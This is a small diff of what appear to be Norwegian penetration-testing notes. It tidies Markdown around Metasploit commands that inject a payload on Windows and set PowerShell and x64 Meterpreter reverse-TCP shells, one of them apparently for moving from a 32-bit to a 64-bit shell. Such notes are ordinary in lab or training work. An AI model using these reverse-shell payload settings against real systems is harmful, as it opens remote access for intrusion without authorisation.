@@ -30,9 +30,6 @@ tror denne er riktig.
 
 ```
 use exploit/windows/local/payload_inject
-```
-
-```
 set payload windows/powershell_reverse_tcp
 ```
 
@@ -45,10 +42,4 @@ gjøre fra 32 til 64 bit shell
 `use windows/local/payload_inject`
 
 `set payload windows/x64/meterpreter/reverse_tcp`
-
-
-
-
-
-
 
